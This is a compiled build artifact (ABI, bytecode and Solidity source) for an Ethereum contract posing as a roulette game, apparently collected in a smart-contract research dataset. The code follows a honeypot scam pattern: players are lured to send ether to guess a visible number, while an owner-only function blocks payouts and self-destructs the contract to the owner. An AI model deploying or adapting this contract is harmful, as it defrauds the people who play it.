{
  "contractName": "R",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "result",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_number",
          "type": "uint8"
        }
      ],
      "name": "Play",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_number",
          "type": "uint8"
        }
      ],
      "name": "StartRoulette",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_number",
          "type": "uint8"
        }
      ],
      "name": "StopGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260008060006101000a81548160ff021916908360ff16021790555060008060016101000a81548160ff02191690831515021790555034801561004557600080fd5b5061038a806100556000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680636537214714610064578063ab5783c414610095578063b2c3609b146100b8578063f1b6315e146100db575b005b34801561007057600080fd5b506100796100fe565b604051808260ff1660ff16815260200191505060405180910390f35b6100b6600480360381019080803560ff169060200190929190505050610110565b005b6100d9600480360381019080803560ff1690602001909291905050506101dc565b005b6100fc600480360381019080803560ff1690602001909291905050506102c8565b005b6000809054906101000a900460ff1681565b600060029054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561016c57600080fd5b610174610341565b806000806101000a81548160ff021916908360ff16021790555067011c37937e0800003411156101d957600060029054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b50565b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561021657600080fd5b8060ff166000809054906101000a900460ff1660ff16148015610240575067016345785d8a000034115b80156102595750600060019054906101000a900460ff16155b156102c5573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102bb573d6000803e3d6000fd5b506102c4610341565b5b50565b60008060009054906101000a900460ff1660ff16141561033e57806000806101000a81548160ff021916908360ff16021790555033600060026101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b6001600060016101000a81548160ff0219169083151502179055505600a165627a7a72305820de8644cf83c6e3b2058109119a01292e8f603739bb60744c31f3efedad13ff630029",
  "source": "\n\ncontract R\n{\n\n    uint8 public result = 0;\n\n    bool finished = false;\n\n    address rouletteOwner;\n\n    function Play(uint8 _number)\n    external\n    payable\n    {\n        require(msg.sender == tx.origin);\n        if(result == _number && msg.value>0.1 ether && !finished)\n        {\n            msg.sender.transfer(this.balance);\n            GiftHasBeenSent();\n        }\n    }\n\n    function StartRoulette(uint8 _number)\n    public\n    payable\n    {\n        if(result==0)\n        {\n            result = _number;\n            rouletteOwner = msg.sender;\n        }\n    }\n\n    function StopGame(uint8 _number)\n    public\n    payable\n    {\n        require(msg.sender == rouletteOwner);\n        GiftHasBeenSent();\n        result = _number;\n        if (msg.value>0.08 ether){\n            selfdestruct(rouletteOwner);\n        }\n    }\n\n    function GiftHasBeenSent()\n    private\n    {\n        finished = true;\n    }\n\n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x197803b104641fbf6e206a425d9dc35dadc4f62f/contracts/0x197803b104641fbf6e206a425d9dc35dadc4f62f.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:48:37.639Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}